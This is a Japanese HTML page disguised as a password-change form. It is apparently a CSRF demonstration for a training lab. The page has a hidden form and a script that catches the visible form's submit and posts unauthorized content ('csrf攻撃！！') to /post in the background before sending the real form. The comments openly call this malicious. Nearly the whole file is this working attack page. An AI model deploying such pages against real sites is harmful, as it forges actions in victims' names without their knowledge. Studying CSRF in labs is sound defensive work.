<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <title>パスワード変更</title>
</head>
<body>
    <h1>パスワード変更</h1>
    <form  id="passwordChangeForm" method="POST" action="/csrf_attack"> 
        <div>
            <label for="current_password">現在のパスワード</label>
            <input id="current_password" name="current_password" required>
        </div>
        <div>
            <label for="new_password">新しいパスワード</label>
            <input id="new_password" name="new_password" required>
        </div>
        <div>
            <label for="confirm_new_password">新しいパスワード（確認）</label>
            <input id="confirm_new_password" name="confirm_new_password" required>
        </div>
        <div>
            <button type="submit">パスワードを変更</button>
        </div>
    </form>
    
    <!-- 悪意のある不正投稿 -->
    <form  id="csrfForm" method="POST" action="/post" style="display: none;">
        <input type="hidden" name="content" value="csrf攻撃！！"> <!-- CSRF: csef_attack.html -->
    </form>


    <script>
        document.getElementById('passwordChangeForm').addEventListener('submit', function(event) {
            event.preventDefault(); // パスワード変更フォームの送信を一旦停止
            // CSRFフォームをバックグラウンドで送信
            const csrfForm = document.getElementById('csrfForm');
            const formData = new FormData(csrfForm);

            fetch(csrfForm.action, {
                method: 'POST',
                body: formData
            }).then(function(response) {
                // CSRFフォームの送信後にパスワード変更フォームを送信
                if (response.ok) {
                    document.getElementById('passwordChangeForm').submit();
                } else {
                    console.error('CSRF攻撃の送信に失敗しました');
                }
            }).catch(function(error) {
                console.error('エラーが発生しました: ', error);
            });
        });
    </script>
</body>
</html>


